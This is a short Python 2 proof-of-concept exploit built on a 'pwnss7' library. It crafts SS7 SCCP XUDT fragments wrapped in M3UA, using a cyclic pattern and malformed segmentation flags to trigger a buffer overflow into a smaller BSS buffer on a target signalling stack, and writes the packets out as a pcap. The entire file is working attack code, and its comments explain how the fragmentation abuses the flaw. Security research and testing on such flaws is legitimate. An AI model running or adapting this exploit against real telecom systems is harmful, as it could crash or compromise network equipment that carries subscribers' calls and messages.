#!/usr/bin/env python2

import subprocess
import sys
from cStringIO import StringIO
from binascii import unhexlify
from itertools import islice
import string


# add pwnss7 directory to be able to import pwnss7 submodules
import sys
from os import path
sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))


from pwnss7.m3ua import encode_data
from pwnss7.sccp import encode_xudt
from pwnss7.ber import encode_ber, decode_ber, Asn1Obj, encode_integer
from pwnss7.util import cyclic, split_by, convert2pcap

msg = cyclic(8192)
xudt_size = 200

pkts = [frag for frag in split_by(msg, xudt_size)]

CALLED_GT = unhexlify('12930011047228190600')
CALLING_GT = unhexlify('1206001104722819604106')

# first XUDT: first segment and at least one remaining fragment
pkts[0] = encode_data(
  encode_xudt(
    pkts[0],
    1, 1, # first segment, one fragment remaining
    CALLED_GT, CALLING_GT,
  ),
  666, # originating point code
  1337,# destination point code
  0    # signalling link selection
)

# intermediate XUDT: not the first, but fragments remain
for i in range(1, len(pkts)-1):
  pkts[i] = encode_data(
    encode_xudt(
      pkts[i],
      0, 1, # last segment, but one fragment remaining. NOTE this is weird, and relates to a vulnerability of target
      CALLED_GT, CALLING_GT,
    ),
    666, # originating point code
    1337,# destination point code
    0    # signalling link selection
  )

# last XUDT: not the first, and no fragment remains
pkts[-1] = encode_data(
  encode_xudt(
    pkts[-1],
    0, 0, # last segment, and no more fragments remaining. This will trigger copy into smaller BSS buffer
    CALLED_GT, CALLING_GT,
  ),
  666, # originating point code
  1337,# destination point code
  0    # signalling link selection
)


pcap = convert2pcap(pkts)
sys.stdout.write(pcap)
